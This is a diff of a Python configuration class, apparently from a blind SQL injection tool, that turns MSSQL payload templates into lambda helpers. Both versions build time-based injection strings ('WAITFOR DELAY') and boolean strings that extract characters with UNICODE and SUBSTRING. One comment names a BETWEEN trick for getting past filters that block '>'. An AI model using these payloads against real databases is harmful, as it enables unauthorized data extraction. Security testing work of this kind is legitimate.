@@ -1,6 +1,5 @@
 #!/bin/python
 
-from string import Template
 from .abstractConfig import AbstractConfig
 
 class MsSqlConfig(AbstractConfig):
@@ -8,20 +7,16 @@ class MsSqlConfig(AbstractConfig):
     end_char: int = 0
     start_index: int = 1
 
-    def get_equal_compare(self, value: int) -> str:
-        return f"={value}"
-
-    def get_diff_compare(self, value: int) -> str:
-        return f"!={value}"
-
-    def get_supp_compare(self, value: int, min: int, max: int) -> str:
-        """Between because '>' is often blacklisted"""
-        return f" BETWEEN {value + 1} AND {max}"
-
-    def wrap_request(self, request: str) -> str:
-        return f"ISNULL(({request}),'')"
-
-    payload_int_time: Template = Template(';IF (($request)$test) WAITFOR DELAY \'0:0:$sleep_duration\'')
-    payload_str_time: Template = Template(';IF (ISNULL(UNICODE(SUBSTRING(($request),$index,1)),0)$test) WAITFOR DELAY \'0:0:$sleep_duration\'')
-    payload_int_bool: Template = Template('($request)$test')
-    payload_str_bool: Template = Template('ISNULL(UNICODE(SUBSTRING(($request),$index,1)),0)$test')
+    equal      = staticmethod(lambda v: f"={v}")
+    range_     = staticmethod(lambda v, mn, mx: f" BETWEEN {v + 1} AND {mx}")
+    substring  = staticmethod(lambda expr, i: f"SUBSTRING(({expr}),{i},1)")
+    char_code  = staticmethod(lambda expr: f"UNICODE({expr})")
+    length     = staticmethod(lambda expr: f"LEN({expr})")
+    code_or_end = staticmethod(lambda expr: f"ISNULL(({expr}),0)")
+    is_null     = staticmethod(lambda expr: f"({expr}) IS NULL")
+    has_result  = staticmethod(lambda req: f"EXISTS({req})")
+    limit      = staticmethod(lambda offset, n: f"OFFSET {offset} ROWS FETCH NEXT {n} ROWS ONLY")
+    as_boolean = staticmethod(lambda cond: f"({cond})")
+    as_time    = staticmethod(
+        lambda cond, delay: f";IF ({cond}) WAITFOR DELAY '0:0:{delay}'"
+    )
